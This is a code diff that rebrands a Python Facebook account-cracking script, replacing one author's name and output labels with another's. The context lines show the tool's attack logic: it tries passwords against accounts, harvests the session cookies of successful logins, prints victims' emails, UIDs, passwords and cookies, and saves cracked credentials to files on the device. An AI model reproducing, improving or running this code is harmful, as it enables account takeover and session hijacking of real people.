@@ -71,8 +71,8 @@ def clear():
     os.system('clear')
     print(logo)
 logo =f"""____________________
-AUTHOR    : MR JADUGAR GAMERS
-FACEBOOK : KASHIF BALOCH
+AUTHOR    : Jahid-444
+FACEBOOK : Md Jahid Hassan
 VERSION    : 1.1
                                    [THE DEAD USER]
 ____________________"""
@@ -230,7 +230,7 @@ def free(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\033[1;32m[√]---------------------[JADU-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
+                print('\r\033[1;32m[√]---------------------[JAHID-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                 cek_apk(session,coki)
                 open('/sdcard/Jadugar-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(cid)
@@ -239,8 +239,8 @@ def free(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid=coki[24:39]
                 Red = '\033[1;31m'
-                print(f'\r{Red}[×]--------------------[JADU-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
-                open('/sdcard/Jadugar-CP.txt', 'a').write(cid+' | '+ps+'\n')
+                print(f'\r{Red}[×]--------------------[JAHID-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
+                open('/sdcard/Jahid-CP.txt', 'a').write(cid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             elif '/x/checkpoint' in log_cookies:
@@ -248,12 +248,12 @@ def free(uid,pwx,tl):
                 cid=coki[7:22]
                 Red = '\033[1;31m'
                 print(f'\r{YELLOW}[TEMP-LOCK] '+cid+' | '+ps+'\033[1;97m')
-                open('/sdcard/Jadugar-2F.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/Jahid-2F.txt', 'a').write(cid+' | '+ps+'\n')
                 twf.append(cid)
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[JADUGAR] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
+        sys.stdout.write(f'\r\33[1;37m[JAHID] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
         sys.stdout.flush()
         checks(oks,cps,twf)
     except:
